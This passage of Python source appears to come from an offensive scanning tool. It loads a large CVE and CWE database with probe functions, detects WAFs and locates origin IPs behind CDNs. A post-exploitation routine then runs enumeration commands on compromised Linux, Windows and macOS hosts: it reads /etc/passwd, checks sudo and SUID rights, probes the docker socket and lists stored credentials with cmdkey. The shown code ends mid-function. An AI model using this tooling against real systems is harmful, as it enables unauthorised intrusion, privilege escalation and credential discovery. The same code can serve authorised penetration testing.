add_cve("CVE-2026-23918", "Apache HTTP Server", "CWE-415", 9.8, "rce", probe_generic_cve, ((2,4,66,0),(2,4,66,0)), ["apache","http2","rce"])
add_cve("CVE-2025-54920", "Apache Spark", "CWE-502", 8.8, "rce", probe_generic_cve, ((0,0,0,0),(3,5,4,0)), ["spark","rce"])
add_cve("CVE-2025-64408", "Apache Causeway", "CWE-502", 8.8, "rce", probe_generic_cve, ((0,0,0,0),(99,99,99,99)), ["causeway","rce"])
add_cve("CVE-2026-42779", "Apache MINA", "CWE-502", 7.5, "rce", probe_generic_cve, ((2,1,0,0),(2,2,6,0)), ["mina","deserialization"])
add_cve("CVE-2025-58136", "Apache Traffic Server", "CWE-20", 5.3, "dos", probe_generic_cve, ((9,0,0,0),(10,1,1,0)), ["traffic-server","dos"])
add_cve("CVE-2026-27446", "Apache Artemis", "CWE-306", 8.1, "auth-bypass", probe_generic_cve, ((2,11,0,0),(2,44,0,0)), ["artemis","auth-bypass"])
add_cve("CVE-2025-29847", "Apache Linkis", "CWE-22", 7.5, "file-read", probe_generic_cve, ((1,3,0,0),(1,7,0,0)), ["linkis","file-read"])
add_cve("CVE-2026-33027", "NGINX UI", "CWE-22", 8.1, "path-traversal", probe_generic_cve, ((2,0,0,0),(2,5,0,0)), ["nginx-ui","path-traversal"])
add_cve("CVE-2026-33032", "NGINX UI", "CWE-306", 9.8, "auth-bypass", probe_generic_cve, ((2,0,0,0),(2,5,0,0)), ["nginx-ui","auth-bypass"])
add_cve("CVE-2026-42220", "NGINX UI", "CWE-287", 7.5, "auth-bypass", probe_generic_cve, ((2,0,0,0),(2,5,0,0)), ["nginx-ui","auth-bypass"])
add_cve("CVE-2026-107813", "NGINX UI", "CWE-863", 7.5, "auth-bypass", probe_generic_cve, ((2,5,0,0),(2,5,99,99)), ["nginx-ui","auth-bypass"])
add_cve("CVE-2026-107805", "NGINX UI", "CWE-400", 5.3, "dos", probe_generic_cve, ((2,5,0,0),(2,5,99,99)), ["nginx-ui","dos"])
add_cve("CVE-2025-70974", "FastJSON", "CWE-502", 9.8, "rce", probe_generic_cve, ((0,0,0,0),(1,2,48,0)), ["fastjson","autotype"])
add_cve("CVE-2022-25845", "FastJSON", "CWE-502", 9.8, "rce", probe_generic_cve, ((0,0,0,0),(1,2,83,0)), ["fastjson","deserialization"])
add_cve("CVE-2024-57763", "MSFM", "CWE-502", 8.8, "rce", probe_generic_cve, ((0,0,0,0),(2025,1,1,0)), ["msfm","fastjson"])
add_cve("CVE-2026-49373", "JetBrains TeamCity", "CWE-94", 8.1, "rce", probe_generic_cve, ((0,0,0,0),(2026,1,0,0)), ["teamcity","perforce","rce"])
add_cve("CVE-2026-23515", "Signal K", "CWE-78", 9.8, "rce", probe_generic_cve, ((0,0,0,0),(99,99,99,99)), ["signal-k","rce"])
add_cve("CVE-2026-55454", "Appsmith", "CWE-306", 9.9, "auth-bypass", probe_generic_cve, ((0,0,0,0),(2,1,0,0)), ["appsmith","caddy","auth-bypass"])
add_cve("CVE-2025-53827", "ownCloud", "CWE-749", 9.1, "rce", probe_generic_cve, ((0,0,0,0),(10,15,3,0)), ["owncloud","rce"])
add_cve("CVE-2026-23835", "LobeHub", "CWE-862", 5.3, "auth-bypass", probe_generic_cve, ((0,0,0,0),(99,99,99,99)), ["lobehub","presigned-upload"])
add_cve("CVE-2026-25141", "Orval", "CWE-94", 9.8, "rce", probe_generic_cve, ((0,0,0,0),(99,99,99,99)), ["orval","code-injection"])
add_cve("CVE-2026-25128", "fast-xml-parser", "CWE-400", 7.5, "dos", probe_generic_cve, ((0,0,0,0),(99,99,99,99)), ["fast-xml-parser","dos"])
add_cve("CVE-2026-25047", "deepHas", "CWE-1321", 9.8, "prototype-pollution", probe_generic_cve, ((0,0,0,0),(99,99,99,99)), ["deephas","prototype-pollution"])
add_cve("CVE-2026-25152", "@backstage/plugin-techdocs-node", "CWE-22", 5.3, "path-traversal", probe_generic_cve, ((0,0,0,0),(99,99,99,99)), ["backstage","path-traversal"])

# --- AI / Langchain ---
add_cve("CVE-2026-75128", "Langchain-Chatchat", "CWE-862", 9.3, "rce", probe_chatchat_tools, ((0,0,0,0),(0,3,1,3)), ["chatchat","langchain","shell-rce"])
add_cve("CVE-2026-111057", "Mercury", "CWE-287", 9.8, "rce", probe_mercury_terminal, ((3,0,0,0),(3,2,3,99)), ["mercury","jupyter","terminal-rce"])

# --- CMS / Web Apps ---
add_cve("CVE-2026-114728", "Roundcube Webmail", "CWE-184", 6.1, "xss-bypass", probe_roundcube, ((0,0,0,0),(1,6,19,99)), ["roundcube","css-escape"])
add_cve("CVE-2026-114727", "Roundcube Webmail", "CWE-829", 8.1, "file-processing", probe_roundcube, ((0,0,0,0),(1,6,19,99)), ["roundcube","imagemagick"])
add_cve("CVE-2026-114726", "Roundcube Webmail", "CWE-79", 5.4, "xss", probe_roundcube, ((0,0,0,0),(1,6,19,99)), ["roundcube","xss"])
add_cve("CVE-2026-114577", "PHP Travel Agency", "CWE-89", 7.3, "sqli", probe_generic_cve, ((0,0,0,0),(99,99,99,99)), ["php","sqli"])
add_cve("CVE-2025-54473", "Joomla Phoca Commander", "CWE-94", 8.8, "rce", probe_generic_cve, ((1,0,0,0),(4,0,0,0)), ["joomla","phoca","rce"])
add_cve("CVE-2025-30084", "Joomla RSMail", "CWE-79", 6.1, "xss", probe_generic_cve, ((1,19,20,0),(1,22,26,0)), ["joomla","rsmail","xss"])
add_cve("CVE-2026-63048", "Joomla Page Builder CK", "CWE-434", 9.8, "rce", probe_generic_cve, ((1,0,0,0),(3,6,1,99)), ["joomla","page-builder","upload"])
add_cve("CVE-2026-1770", "Crafter CMS Studio", "CWE-94", 8.8, "rce", probe_generic_cve, ((0,0,0,0),(99,99,99,99)), ["crafter","groovy","sandbox-bypass"])
add_cve("CVE-2026-32261", "Craft CMS Webhooks", "CWE-94", 8.8, "rce", probe_generic_cve, ((3,0,0,0),(3,1,99,99)), ["craftcms","twig","ssti"])
add_cve("CVE-2025-57811", "Craft CMS", "CWE-94", 8.8, "rce", probe_generic_cve, ((0,0,0,0),(5,8,6,0)), ["craftcms","ssti"])
add_cve("CVE-2026-42608", "Grav CMS FormFlash", "CWE-22", 9.1, "path-traversal", probe_grav_formflash, ((0,0,0,0),(2,0,0,0)), ["grav","formflash","unauth"])
add_cve("CVE-2026-72819", "Grav CMS", "CWE-94", 8.8, "rce", probe_generic_cve, ((0,0,0,0),(99,99,99,99)), ["grav","zip-upload","rce"])
add_cve("CVE-2026-75827", "Grav CMS", "CWE-94", 9.8, "rce", probe_generic_cve, ((0,0,0,0),(99,99,99,99)), ["grav","blueprint","rce"])
add_cve("CVE-2025-13083", "Drupal Core", "CWE-200", 5.3, "info-leak", probe_generic_cve, ((8,0,0,0),(10,4,9,0)), ["drupal","core","info-leak"])
add_cve("CVE-2025-31674", "Drupal Core", "CWE-502", 8.8, "object-injection", probe_generic_cve, ((8,0,0,0),(10,3,13,0)), ["drupal","core","object-injection"])
add_cve("CVE-2025-48446", "Drupal Commerce Alphabank", "CWE-863", 5.3, "auth-bypass", probe_generic_cve, ((0,0,0,0),(1,0,3,0)), ["drupal","commerce","auth-bypass"])
add_cve("CVE-2025-7715", "Drupal Block Attributes", "CWE-79", 5.4, "xss", probe_generic_cve, ((0,0,0,0),(1,1,0,0)), ["drupal","block-attributes","xss"])
add_cve("CVE-2026-28507", "Idno", "CWE-94", 7.2, "rce", probe_generic_cve, ((0,0,0,0),(99,99,99,99)), ["idno","rce"])
add_cve("CVE-2026-28397", "NocoDB", "CWE-79", 6.1, "stored-xss", probe_generic_cve, ((0,0,0,0),(0,301,3,0)), ["nocodb","stored-xss"])
add_cve("CVE-2026-28514", "Rocket.Chat", "CWE-287", 9.8, "auth-bypass", probe_generic_cve, ((0,0,0,0),(99,99,99,99)), ["rocket-chat","auth-bypass"])
add_cve("CVE-2026-30833", "Rocket.Chat", "CWE-943", 9.8, "auth-bypass", probe_generic_cve, ((0,0,0,0),(99,99,99,99)), ["rocket-chat","ddp-streamer"])
add_cve("CVE-2026-24769", "NocoDB", "CWE-79", 5.4, "xss", probe_generic_cve, ((0,0,0,0),(99,99,99,99)), ["nocodb","xss"])
add_cve("CVE-2026-24768", "NocoDB", "CWE-601", 5.3, "open-redirect", probe_generic_cve, ((0,0,0,0),(99,99,99,99)), ["nocodb","open-redirect"])
add_cve("CVE-2026-53931", "NocoDB", "CWE-918", 6.5, "ssrf", probe_generic_cve, ((0,0,0,0),(99,99,99,99)), ["nocodb","ssrf"])
add_cve("CVE-2026-32031", "OpenClaw", "CWE-288", 8.8, "auth-bypass", probe_generic_cve, ((0,0,0,0),(99,99,99,99)), ["openclaw","path-canonicalization"])
add_cve("CVE-2026-41571", "OIDC Provider", "CWE-287", 8.1, "auth-bypass", probe_generic_cve, ((0,0,0,0),(99,99,99,99)), ["oidc","null-password"])
add_cve("CVE-2026-105016", "Microsoft QUIC", "CWE-122", 9.8, "rce", probe_generic_cve, ((0,0,0,0),(99,99,99,99)), ["microsoft","quic","http3"])
add_cve("CVE-2026-42150", "wlc", "CWE-79", 6.1, "xss", probe_generic_cve, ((0,0,0,0),(99,99,99,99)), ["wlc","xss"])
add_cve("CVE-2026-33230", "nltk", "CWE-79", 6.1, "xss", probe_generic_cve, ((0,0,0,0),(99,99,99,99)), ["nltk","wordnet-app","xss"])
add_cve("CVE-2026-91651", "Oracle Essbase", "CWE-284", 8.8, "takeover", probe_generic_cve, ((0,0,0,0),(99,99,99,99)), ["oracle","essbase","takeover"])
add_cve("CVE-2026-96652", "Plex Media Server", "CWE-918", 7.5, "ssrf", probe_generic_cve, ((0,0,0,0),(99,99,99,99)), ["plex","ssrf","kev"])
add_cve("CVE-2026-96654", "Plex Media Server", "CWE-79", 8.0, "xss", probe_generic_cve, ((0,0,0,0),(99,99,99,99)), ["plex","xss","kev"])
add_cve("CVE-2026-96655", "Plex Media Server", "CWE-918", 7.5, "ssrf", probe_generic_cve, ((0,0,0,0),(99,99,99,99)), ["plex","ssrf","kev"])
add_cve("CVE-2026-96656", "Plex Media Server", "CWE-73", 8.1, "lfi", probe_generic_cve, ((0,0,0,0),(99,99,99,99)), ["plex","lfi","kev"])
add_cve("CVE-2026-106931", "SiteGuard Server", "CWE-78", 9.8, "rce", probe_generic_cve, ((0,0,0,0),(99,99,99,99)), ["siteguard","rce","kev"])
add_cve("CVE-2026-110936", "Siemens Software Center", "CWE-427", 7.8, "search-path", probe_generic_cve, ((0,0,0,0),(99,99,99,99)), ["siemens","search-path","kev"])
add_cve("CVE-2026-111813", "Apache Traffic Server", "CWE-20", 5.3, "input-validation", probe_generic_cve, ((0,0,0,0),(99,99,99,99)), ["traffic-server","imagemagick"])
add_cve("CVE-2026-20356", "Cisco", "CWE-400", 7.5, "dos", probe_generic_cve, ((0,0,0,0),(99,99,99,99)), ["cisco","dos"])
add_cve("CVE-2026-20358", "Cisco", "CWE-73", 6.5, "file-path", probe_generic_cve, ((0,0,0,0),(99,99,99,99)), ["cisco","file-path"])
add_cve("CVE-2026-110803", "Vaadin", "CWE-400", 7.5, "dos", probe_generic_cve, ((0,0,0,0),(99,99,99,99)), ["vaadin","session-lock"])
add_cve("CVE-2026-72898", "Metabase", "CWE-89", 9.8, "sqli", probe_generic_cve, ((0,0,0,0),(0,59,0,0)), ["metabase","sqli","kev"])
add_cve("CVE-2026-54527", "JupyterLab Git Extension", "CWE-79", 9.0, "stored-xss", probe_generic_cve, ((0,0,0,0),(99,99,99,99)), ["jupyterlab","stored-xss"])
add_cve("CVE-2026-44727", "pgAdmin", "CWE-89", 8.8, "sqli", probe_generic_cve, ((0,0,0,0),(99,99,99,99)), ["pgadmin","sqli"])
add_cve("CVE-2026-32703", "OpenProject", "CWE-79", 6.1, "persistent-xss", probe_generic_cve, ((0,0,0,0),(99,99,99,99)), ["openproject","xss"])
add_cve("CVE-2026-32698", "OpenProject", "CWE-89", 9.8, "rce", probe_generic_cve, ((0,0,0,0),(99,99,99,99)), ["openproject","sqli","path-traversal"])
add_cve("CVE-2026-27702", "n8n", "CWE-94", 8.8, "rce", probe_generic_cve, ((0,0,0,0),(2,9,2,99)), ["n8n","expression-injection"])
add_cve("CVE-2026-41940", "cPanel/WHM", "CWE-287", 9.8, "auth-bypass", probe_generic_cve, ((0,0,0,0),(11,136,0,4)), ["cpanel","auth-bypass","kev"])  # NEW: NCSC

# --- DevOps / Mail / DB ---
add_cve("CVE-2026-60004", "Gitea", "CWE-94", 9.8, "rce", probe_gitea, ((1,17,0,0),(1,27,0,0)), ["gitea","rce"])
add_cve("CVE-2026-20896", "Gitea", "CWE-287", 9.8, "auth-bypass", probe_gitea, ((1,17,0,0),(1,27,0,0)), ["gitea","auth-bypass"])
add_cve("CVE-2026-53435", "Jenkins", "CWE-502", 8.8, "deserialization", probe_jenkins, ((0,0,0,0),(2,567,0,0)), ["jenkins","deserialization"])
add_cve("CVE-2026-73570", "Zimbra", "CWE-78", 9.8, "rce", probe_zimbra, ((0,0,0,0),(10,1,19,0)), ["zimbra","snmp"])
add_cve("CVE-2026-25243", "Redis", "CWE-415", 8.8, "rce", probe_redis, ((0,0,0,0),(8,6,3,0)), ["redis","restore"])
add_cve("CVE-2026-2005", "PostgreSQL", "CWE-122", 9.8, "rce", probe_postgres, ((0,0,0,0),(18,1,99,0)), ["postgres","pgcrypto"])
add_cve("CVE-2026-88771", "Citrix NetScaler", "CWE-78", 9.8, "rce", probe_citrix, ((0,0,0,0),(14,1,0,0)), ["citrix","rce"])
add_cve("CVE-2026-20253", "Fortinet FortiOS", "CWE-787", 9.8, "rce", probe_fortinet, ((7,0,0,0),(7,6,3,0)), ["fortinet","rce","kev"])
add_cve("CVE-2026-111058", "Mercury", "CWE-862", 9.8, "rce", probe_mercury, ((0,0,0,0),(3,2,5,0)), ["mercury","jupyter","unauth-rce"])
add_cve("CVE-2026-27493", "n8n", "CWE-94", 9.5, "rce", probe_n8n, ((0,0,0,0),(2,10,0,99)), ["n8n","expression-injection"])

# --- AVideo, FreeScout, DNN, SMW, Caddy ---
add_cve("CVE-2026-29058", "AVideo", "CWE-78", 9.8, "rce", probe_avideo_cmdi, ((0,0,0,0),(7,0,0,0)), ["avideo","cmdi","unauth"])
add_cve("CVE-2026-27636", "FreeScout", "CWE-434", 8.8, "rce", probe_freescout_htaccess, ((0,0,0,0),(1,8,205,0)), ["freescout","htaccess","rce"])
add_cve("CVE-2026-40321", "DNN", "CWE-79", 8.8, "xss", probe_dnn_svg, ((0,0,0,0),(10,2,1,0)), ["dnn","svg","xss"])
add_cve("CVE-2026-40305", "DNN", "CWE-639", 6.5, "auth-bypass", probe_dnn_svg, ((6,0,0,0),(10,2,1,0)), ["dnn","friends","idor"])
add_cve("CVE-2026-24838", "DNN", "CWE-79", 6.1, "xss", probe_dnn_svg, ((0,0,0,0),(10,2,0,0)), ["dnn","richtext","xss"])
add_cve("CVE-2026-24833", "DNN", "CWE-79", 5.4, "xss", probe_dnn_svg, ((0,0,0,0),(10,2,0,0)), ["dnn","persona-bar","xss"])
add_cve("CVE-2026-77610", "Semantic MediaWiki", "CWE-79", 6.1, "xss", probe_semantic_mediawiki, ((0,0,0,0),(99,99,99,99)), ["mediawiki","smw","xss"])
add_cve("CVE-2026-77281", "Caddy", "CWE-400", 6.5, "dos", probe_caddy_placeholder, ((0,0,0,0),(2,10,0,99)), ["caddy","dos","placeholder"])

# --- Additional real CVEs (2024-2025) ---
add_cve("CVE-2024-25600", "bricks", "CWE-94", 9.8, "rce", probe_generic_cve, ((1,9,1,0),(1,9,6,0)), ["theme","rce"])
add_cve("CVE-2024-27956", "wp-automatic", "CWE-89", 9.8, "sqli", probe_generic_cve, ((0,0,0,0),(3,92,0,0)), ["plugin","sqli","kev"])
add_cve("CVE-2024-8353", "give", "CWE-502", 9.8, "rce", probe_generic_cve, ((0,0,0,0),(3,16,2,0)), ["plugin","object-injection"])
add_cve("CVE-2024-44000", "litespeed-cache", "CWE-287", 9.8, "auth-bypass", probe_generic_cve, ((0,0,0,0),(6,5,0,0)), ["plugin","auth-bypass"])
add_cve("CVE-2024-10924", "really-simple-ssl", "CWE-287", 9.8, "auth-bypass", probe_generic_cve, ((0,0,0,0),(9,1,0,0)), ["plugin","auth-bypass"])
add_cve("CVE-2025-4665", "contact-form-cfdb7", "CWE-89", 9.6, "sqli", probe_generic_cve, ((0,0,0,0),(1,3,2,0)), ["plugin","sqli","pre-auth"])
add_cve("CVE-2025-24813", "Apache Tomcat", "CWE-22", 9.8, "rce", probe_generic_cve, ((9,0,0,0),(11,0,3,0)), ["tomcat","path-equivalence","kev"])
add_cve("CVE-2025-32432", "Craft CMS", "CWE-94", 9.8, "rce", probe_generic_cve, ((3,0,0,0),(5,6,0,0)), ["craftcms","rce"])
add_cve("CVE-2024-6886", "Gitea", "CWE-79", 8.8, "stored-xss", probe_generic_cve, ((1,0,0,0),(1,22,1,0)), ["gitea","xss"])
add_cve("CVE-2024-33288", "Prison Management System", "CWE-89", 8.8, "sqli", probe_generic_cve, ((0,0,0,0),(99,99,99,99)), ["php","sqli"])
add_cve("CVE-2024-33722", "SOPlanning", "CWE-89", 8.8, "sqli", probe_generic_cve, ((0,0,0,0),(1,52,0,0)), ["soplanning","sqli"])
add_cve("CVE-2024-36058", "Koha Library", "CWE-89", 8.1, "blind-sqli", probe_generic_cve, ((0,0,0,0),(99,99,99,99)), ["koha","sqli"])
add_cve("CVE-2024-58341", "OpenCart", "CWE-89", 9.8, "unauth-sqli", probe_generic_cve, ((0,0,0,0),(4,0,3,0)), ["opencart","sqli"])
add_cve("CVE-2024-14025", "Video Station", "CWE-89", 8.8, "sqli", probe_generic_cve, ((0,0,0,0),(99,99,99,99)), ["synology","sqli"])
add_cve("CVE-2024-55270", "Student Management System", "CWE-89", 9.8, "sqli", probe_generic_cve, ((0,0,0,0),(99,99,99,99)), ["php","sqli"])
add_cve("CVE-2024-44065", "Cloudlog", "CWE-89", 8.8, "blind-sqli", probe_generic_cve, ((0,0,0,0),(99,99,99,99)), ["cloudlog","sqli"])
add_cve("CVE-2024-39037", "MyNET", "CWE-89", 9.8, "unauth-sqli", probe_generic_cve, ((0,0,0,0),(99,99,99,99)), ["mynet","sqli"])
add_cve("CVE-2024-57521", "RuoYi CMS", "CWE-89", 8.8, "sqli", probe_generic_cve, ((0,0,0,0),(4,8,0,0)), ["ruoyi","sqli"])
add_cve("CVE-2024-58316", "Online Shopping System", "CWE-89", 9.8, "sqli", probe_generic_cve, ((0,0,0,0),(99,99,99,99)), ["php","sqli"])
add_cve("CVE-2024-58307", "CSZCMS", "CWE-89", 8.8, "sqli", probe_generic_cve, ((0,0,0,0),(99,99,99,99)), ["cszcms","sqli"])
add_cve("CVE-2024-58309", "xbtitFM", "CWE-89", 9.8, "unauth-sqli", probe_generic_cve, ((0,0,0,0),(99,99,99,99)), ["xbtitfm","sqli"])
add_cve("CVE-2024-58308", "Quick.CMS", "CWE-89", 8.8, "sqli", probe_generic_cve, ((0,0,0,0),(99,99,99,99)), ["quickcms","sqli"])
add_cve("CVE-2024-58290", "Xhibiter NFT Marketplace", "CWE-89", 9.8, "sqli", probe_generic_cve, ((0,0,0,0),(99,99,99,99)), ["xhibiter","sqli"])
add_cve("CVE-2024-58301", "Purei CMS", "CWE-89", 8.8, "blind-sqli", probe_generic_cve, ((0,0,0,0),(99,99,99,99)), ["purei","sqli"])
add_cve("CVE-2024-2172", "Joomla", "CWE-79", 8.8, "stored-xss", probe_generic_cve, ((4,0,0,0),(5,1,0,0)), ["joomla","xss"])
add_cve("CVE-2024-28000", "LiteSpeed Cache", "CWE-288", 9.8, "auth-bypass", probe_generic_cve, ((0,0,0,0),(6,4,0,0)), ["litespeed","auth-bypass"])
add_cve("CVE-2024-37084", "Spring Cloud", "CWE-434", 9.8, "upload", probe_generic_cve, ((0,0,0,0),(4,1,0,0)), ["spring-cloud","upload"])
add_cve("CVE-2024-31982", "XWiki", "CWE-89", 9.8, "sqli", probe_generic_cve, ((0,0,0,0),(14,10,10,0)), ["xwiki","sqli"])
add_cve("CVE-2024-21626", "runc", "CWE-22", 8.6, "container-escape", probe_generic_cve, ((0,0,0,0),(1,1,11,0)), ["runc","container-escape"])
add_cve("CVE-2024-27198", "JetBrains TeamCity", "CWE-288", 9.8, "auth-bypass", probe_generic_cve, ((0,0,0,0),(2024,3,0,0)), ["teamcity","auth-bypass","kev"])
add_cve("CVE-2024-23897", "Jenkins", "CWE-20", 9.8, "file-read", probe_generic_cve, ((0,0,0,0),(2,441,0,0)), ["jenkins","file-read","kev"])
add_cve("CVE-2024-21650", "Discourse", "CWE-79", 9.0, "stored-xss", probe_generic_cve, ((0,0,0,0),(3,2,0,0)), ["discourse","xss"])
add_cve("CVE-2024-22120", "Zabbix Server", "CWE-89", 9.9, "sqli", probe_generic_cve, ((0,0,0,0),(6,4,0,0)), ["zabbix","sqli"])
add_cve("CVE-2024-23113", "Fortinet FortiOS", "CWE-134", 9.8, "format-string", probe_generic_cve, ((7,0,0,0),(7,4,2,0)), ["fortinet","format-string","kev"])
add_cve("CVE-2024-24758", "NodeBB", "CWE-79", 8.8, "xss", probe_generic_cve, ((0,0,0,0),(3,9,0,0)), ["nodebb","xss"])
add_cve("CVE-2024-22024", "Ivanti Connect Secure", "CWE-287", 9.8, "auth-bypass", probe_generic_cve, ((0,0,0,0),(22,7,0,0)), ["ivanti","auth-bypass","kev"])
add_cve("CVE-2024-21630", "Laravel", "CWE-89", 8.8, "sqli", probe_generic_cve, ((0,0,0,0),(10,0,0,0)), ["laravel","sqli"])

# --- 2025 New from Nuclei ---
add_cve("CVE-2026-42018", "JFrog Artifactory", "CWE-287", 8.1, "auth-bypass", probe_generic_cve, ((0,0,0,0),(99,99,99,99)), ["artifactory","auth-bypass","kev"])  # NEW
add_cve("CVE-2026-86218", "N-able N-central", "CWE-94", 9.8, "rce", probe_generic_cve, ((0,0,0,0),(2026,3,1,14)), ["n-able","rce","kev"])  # NEW
add_cve("CVE-2026-49468", "LiteLLM Proxy", "CWE-287", 9.8, "auth-bypass", probe_generic_cve, ((0,0,0,0),(1,84,0,0)), ["litellm","auth-bypass"])  # NEW
add_cve("CVE-2026-9103", "Langflow OSS", "CWE-287", 9.8, "auth-bypass", probe_generic_cve, ((0,0,0,0),(99,99,99,99)), ["langflow","superuser"])  # NEW
add_cve("CVE-2026-1340", "Ivanti EPMM", "CWE-94", 9.8, "rce", probe_generic_cve, ((0,0,0,0),(12,8,0,0)), ["ivanti","rce","kev"])  # NEW
add_cve("CVE-2025-62593", "Ray", "CWE-94", 9.8, "rce", probe_generic_cve, ((0,0,0,0),(2,52,0,0)), ["ray","rce","kev"])  # NEW
add_cve("CVE-2025-14847", "MongoDB Server", "CWE-200", 7.5, "info-disclosure", probe_generic_cve, ((0,0,0,0),(99,99,99,99)), ["mongodb","info-disclosure","kev"])  # NEW
add_cve("CVE-2024-57728", "SimpleHelp", "CWE-434", 8.8, "upload", probe_generic_cve, ((0,0,0,0),(5,5,7,0)), ["simplehelp","upload","kev"])  # NEW

# --- CISA KEV (reference, confidence 0) ---
add_cve("CVE-2026-104935", "CISA KEV Entry", "CWE-0", 0.0, "unknown", probe_generic_cve, ((0,0,0,0),(99,99,99,99)), ["kev","ref-only"])
add_cve("CVE-2026-96951", "CISA KEV Entry", "CWE-0", 0.0, "unknown", probe_generic_cve, ((0,0,0,0),(99,99,99,99)), ["kev","ref-only"])
add_cve("CVE-2026-76519", "CISA KEV Entry", "CWE-0", 0.0, "unknown", probe_generic_cve, ((0,0,0,0),(99,99,99,99)), ["kev","ref-only"])
add_cve("CVE-2026-0322", "CISA KEV Entry", "CWE-0", 0.0, "unknown", probe_generic_cve, ((0,0,0,0),(99,99,99,99)), ["kev","ref-only"])
add_cve("CVE-2026-21589", "CISA KEV Entry", "CWE-0", 0.0, "unknown", probe_generic_cve, ((0,0,0,0),(99,99,99,99)), ["kev","ref-only"])

ok(f"Database: {len(CVE_DB)} CVEs loaded")

# ---------------------------------------------------------------------------
# CWE DB
# ---------------------------------------------------------------------------
CWE_PATHS = ["/", "/search", "/product", "/blog", "/api", "/login", "/admin", "/user", "/profile", "/dashboard"]
CWE_ENTRIES = [
    ("CWE-79", "Cross-site Scripting (XSS)", cwe_xss, CWE_PATHS, ["xss", "top25"]),
    ("CWE-89", "SQL Injection", cwe_sqli, CWE_PATHS, ["sqli", "top25"]),
    ("CWE-22", "Path Traversal", cwe_path_traversal, CWE_PATHS, ["lfi", "top25"]),
    ("CWE-352", "Cross-Site Request Forgery (CSRF)", cwe_csrf, CWE_PATHS, ["csrf", "top25"]),
    ("CWE-862", "Missing Authorization", cwe_missing_auth, CWE_PATHS, ["auth", "top25"]),
    ("CWE-601", "Open Redirect", cwe_open_redirect, CWE_PATHS, ["redirect", "top25"]),
    ("CWE-693", "Protection Mechanism Failure", cwe_security_headers, CWE_PATHS, ["headers", "top25"]),
]
for cwe_id, cwe_name, fn, paths, tags in CWE_ENTRIES:
    add_cwe(cwe_id, cwe_name, fn, paths, tags)
ok(f"Database: {len(CWE_DB)} CWEs")

# ---------------------------------------------------------------------------
# POST-EXPLOITATION (v24.1 — None-safe)
# ---------------------------------------------------------------------------
LINUX_ENUM = [("identity","id"),("hostname","hostname"),("kernel","uname -a"),
              ("users","cat /etc/passwd 2>/dev/null | head -15"),("sudo","sudo -n -l 2>/dev/null"),
              ("suid","find / -perm -4000 -type f 2>/dev/null | head -15"),
              ("docker-sock","ls -la /var/run/docker.sock 2>/dev/null")]
WINDOWS_ENUM = [("identity","whoami /all"),("system","systeminfo"),
                ("admins","net localgroup administrators"),("privs","whoami /priv"),
                ("always-install",'reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 2>nul'),
                ("cmdkeys","cmdkey /list 2>nul")]
MAC_ENUM = [("identity","id"),("version","sw_vers"),("users","dscl . -list /Users 2>/dev/null | head -15"),
            ("sudo","sudo -n -l 2>/dev/null"),("suid","find / -perm -4000 -type f 2>/dev/null | head -10")]

def run_post_exploit(exec_fn, cmd="id"):
    probe = (exec_fn("uname -a 2>/dev/null; ver 2>nul; sw_vers 2>/dev/null") or "").lower()  # FIX
    if not probe:
        return {"os": "unknown", "results": {}, "error": "exec_fn returned empty"}
    if "darwin" in probe or "mac os" in probe: os_type, checks = "macos", MAC_ENUM
    elif "windows" in probe or "microsoft" in probe: os_type, checks = "windows", WINDOWS_ENUM
    elif "linux" in probe or "ubuntu" in probe or "debian" in probe: os_type, checks = "linux", LINUX_ENUM
    else: return {"os":"unknown","results":{},"error":"OS detection failed"}
    results = {}
    for label, c in checks:
        try:
            resp = exec_fn(c)
            if resp and not resp.startswith("(error"): results[label] = resp[:2048]
        except Exception: pass
    return {"os": os_type, "results": results}

# ---------------------------------------------------------------------------
# SCANNER (v24.1 — fixed dedup + thread-safe)
# ---------------------------------------------------------------------------
@dataclass
class Finding:
    cve: str; product: str; cwe: str; cvss: float; attack: str
    vulnerable: Optional[bool] = None; confidence: int = 0
    evidence: List[str] = field(default_factory=list); error: Optional[str] = None
    elapsed: float = 0.0; tags: List[str] = field(default_factory=list)

def _better(a: Finding, b: Finding) -> Finding:
    """FIXED: score-based. Low-confidence True does not beat high-confidence None."""
    def score(f):
        if f.vulnerable is True and f.confidence >= 30: return 2
        if f.vulnerable is None: return 1
        return 0
    sa, sb = score(a), score(b)
    if sa != sb: return a if sa > sb else b
    return a if a.confidence >= b.confidence else b

class Scanner:
    def __init__(self, target: str, workers=DEF_WORKERS, timeout=DEF_TIMEOUT, proxy=None, use_origin=True):
        self.base = norm_url(target); self.host = urllib.parse.urlparse(self.base).hostname
        self.workers = workers; self.timeout = timeout; self.proxy = proxy
        self.use_origin = use_origin; self.findings: List[Finding] = []
        self.origin: Optional[dict] = None; self.waf: List[str] = []
        self.honeypot: Optional[HoneypotDetector] = None
        self.post_exploit: Optional[dict] = None; self._http: Optional[HTTP] = None
        self.bypass_mode = False

    def _client(self) -> HTTP:
        if self._http is None:
            self._http = HTTP(self.base, self.timeout, self.proxy, self.origin)
        return self._http

    def detect_waf(self):
        try:
            h = self._client(); r = h.get("")
            server = (r.headers.get("Server") or "").lower()
            hdrs = {k.lower() for k in r.headers}; body = (r.text or "").lower()
            if "cf-ray" in hdrs or "cloudflare" in server: self.waf.append("cloudflare")
            if "akamai" in server: self.waf.append("akamai")
            if "fastly" in server: self.waf.append("fastly")
            if "sucuri" in server: self.waf.append("sucuri")
            if "imperva" in server: self.waf.append("imperva")
            if "wordfence" in server or "wordfence" in body: self.waf.append("wordfence")
        except Exception: pass
        return self.waf

    def find_origin(self) -> bool:
        if not self.host or self.host.replace(".", "").isdigit(): return False
        f = OriginFinder(self.host, self._client()); verified = f.find()
        if verified:
            best = sorted(verified, key=lambda x: (x["status"] != 200, x["port"] != 443))[0]
            self.origin = best; geo = best.get("geo") or {}
            extra = f" ({geo.get('country')}, {geo.get('org')})" if geo else ""
            ok(f"origin: {best['scheme']}://{best['ip']}:{best['port']} [{best['status']}] {best['server']}{extra}")
            return True
        warn("no origin IP; using CDN endpoint"); return False

    def scan_one(self, rec: dict) -> Finding:
        t0 = time.time()
        f = Finding(cve=rec["cve"], product=rec["product"], cwe=rec["cwe"],
                    cvss=rec["cvss"], attack=rec["attack"], tags=list(rec.get("tags", [])))
        try:
            out = rec["detect"](self._client(), "id")
            f.vulnerable = out.get("vulnerable"); f.confidence = out.get("confidence", 0)
            f.evidence = out.get("evidence", [])
            if out.get("error"): f.error = out["error"]
        except Exception as e: f.error = f"{type(e).__name__}: {e}"
        f.elapsed = round(time.time() - t0, 2); return f

    def scan_one_cwe(self, cwe_rec: dict, path: str) -> Finding:
